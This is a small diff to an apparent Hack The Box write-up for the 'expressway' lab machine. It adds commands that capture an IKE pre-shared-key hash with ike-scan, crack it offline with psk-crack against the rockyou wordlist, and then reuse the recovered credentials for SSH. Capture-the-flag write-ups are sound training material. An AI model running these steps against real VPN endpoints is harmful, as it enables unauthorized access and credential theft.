@@ -63,11 +63,16 @@ Now we have a username (`ike`) and know the authentication method is a PSK. The 
 
 `ike-scan` can automatically format the necessary data for cracking with its sister tool, `psk-crack`.
 
-```
+```sh
 sudo ike-scan -A expressway.htb --id=ike@expressway.htb -Pike.psk
 ```
+above cmd created a ike.psk 
 
+```sh
+psk-crack -d /usr/share/wordlists/rockyou.txt ike.psk
+```
 
+reuse these new found creds for ssh access
 
 
 
